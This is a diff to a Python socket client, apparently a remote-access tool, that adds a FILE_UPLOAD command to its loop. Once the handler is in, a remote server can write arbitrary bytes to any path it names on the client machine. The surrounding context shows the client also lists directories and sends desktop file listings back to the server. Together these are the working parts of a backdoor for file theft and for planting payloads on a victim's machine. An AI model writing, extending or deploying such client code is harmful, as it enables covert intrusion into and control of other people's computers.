@@ -55,6 +55,24 @@ def start_client():
 
                         s.send(f"DESKTOP_FILES:{result}".encode('utf-8'))
 
+                    elif data.startswith("FILE_UPLOAD:"):
+                        try:
+                            parts = data[12:].split("||")
+                            target_path = parts[0]
+                            file_size = int(parts[1])
+
+                            received_bytes = 0
+                            with open(target_path, "wb") as f:
+                                while received_bytes < file_size:
+                                    chunk_size = min(4096, file_size - received_bytes)
+                                    chunk = s.recv(chunk_size)
+                                    if not chunk:
+                                        break
+                                    f.write(chunk)
+                                    received_bytes += len(chunk)
+                        except Exception as e:
+                            print(f"Ошибка згрузки файла: {e}")
+
                     elif data.startswith("LIST_DIR:"):
                         path = data[9:]
                         if not path:
